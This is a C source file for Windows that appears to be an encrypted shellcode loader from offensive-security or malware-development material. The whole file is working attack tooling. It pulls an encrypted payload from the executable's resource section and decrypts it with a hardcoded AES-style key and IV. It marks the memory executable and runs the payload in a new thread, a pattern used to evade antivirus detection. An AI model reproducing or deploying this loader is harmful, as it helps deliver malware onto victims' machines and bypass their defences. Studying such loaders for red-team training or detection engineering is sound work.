#include <stdio.h>
#include <Windows.h>
#include "resource.h"
#include "Encryption.h"

// Shellcode key
unsigned char pKey[] = { 0x8b, 0xa1, 0x3c, 0xd0, 0xeb, 0x98, 0xa6, 0xcf, 0x10, 0x1e, 0xe3, 0xb4, 0xab, 0x22, 0x29, 0xb9, 0xf5, 0xc4, 0xfb, 0x52, 0x3f, 0x38, 0xbd, 0x6f, 0xc4, 0x22, 0x39, 0xaf, 0xea, 0x21, 0x0e, 0x7a };

// Shellcode IV
unsigned char pIV[] = { 0xa3, 0xdd, 0x67, 0x75, 0x57, 0xe9, 0x5c, 0x5b, 0x24, 0x96, 0x50, 0xcb, 0xdc, 0x36, 0x8d, 0xdc };

// main function
int main() {
    DWORD oldProtect = NULL;
    PVOID pPlaintext = NULL;
    DWORD dwPlainSize = NULL;

    // Find resource
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (hResource == NULL) {
        printf("[!] FindResource failed\n");
        return 1;
    }

    // Load resource
    HGLOBAL hResourceData = LoadResource(NULL, hResource);
    if (hResourceData == NULL) {
        printf("[!] LoadResource failed\n");
        return 1;
    }

    // Get pointer to resource data
    PVOID pShellcodeAddress = LockResource(hResourceData);
    if (pShellcodeAddress == NULL) {
        printf("[!] LockResource failed\n");
        return 1;
    }

    // Get size of resource
    SIZE_T shellcodeSize = SizeofResource(NULL, hResource);
    if (shellcodeSize == 0) {
        printf("[!] SizeofResource failed\n");
        return 1;
    }

    // Print info
    printf("[+] Shellcode address in '.rsrc' section: 0x%p\n", pShellcodeAddress);
    printf("[+] Encrypted Shellcode size: %d\n", shellcodeSize);

    // Allocate heap memory
    PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, shellcodeSize);
    if (pTmpBuffer == NULL) {
        printf("[!] HeapAlloc failed\n");
        return 1;
    }

    // Copy payload to buffer
    memcpy(pTmpBuffer, pShellcodeAddress, shellcodeSize);
    printf("[+] pTmpBuffer var address: 0x%p\n", pTmpBuffer);

    // Decrypt shellcode
    if (!SimpleDecryption(pTmpBuffer, static_cast<DWORD>(shellcodeSize), pKey, pIV, &pPlaintext, &dwPlainSize)) {
        printf("[!] SimpleDecryption failed\n");
        HeapFree(GetProcessHeap(), 0, pTmpBuffer);
        return 1;
    }

    // Print info
    printf("[+] Decrypted Shellcode size: %d\n", dwPlainSize);


    //  Allocates memory which will be used to store the payload
    PVOID pAllocatedAddress = VirtualAlloc(NULL, dwPlainSize , MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAllocatedAddress == NULL) {
        printf("[!] VirtualAlloc failed with error: %d\n", GetLastError());
        return 1;
    }

    // Show the results
    printf("[+] Allocated address: 0x%p\n\n", pAllocatedAddress);

	// Copy decrypted shellcode to allocated memory
	memcpy(pAllocatedAddress, pPlaintext, dwPlainSize);

	// Change memory protection
	BOOL bProtect = VirtualProtect(pAllocatedAddress, dwPlainSize, PAGE_EXECUTE_READ, &oldProtect);
	if (!bProtect) {
		printf("[!] VirtualProtect failed with error: %d\n", GetLastError());
		return 1;
	}

    // Pause the program
    printf("[~] Press any key to continue...\n");
    getchar();

    // Create a new thread to execute the shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread failed with error: %d\n", GetLastError());
        return 1;
    }

    // Print the thread handle
    printf("[+] Thread created with handle: 0x%p\n\n", hThread);

    // Wait for the thread to complete
    WaitForSingleObject(hThread, -1);
    CloseHandle(hThread);

    // Free memory
    HeapFree(GetProcessHeap(), 0, pTmpBuffer);
    HeapFree(GetProcessHeap(), 0, pPlaintext);
    
    return 0;
}
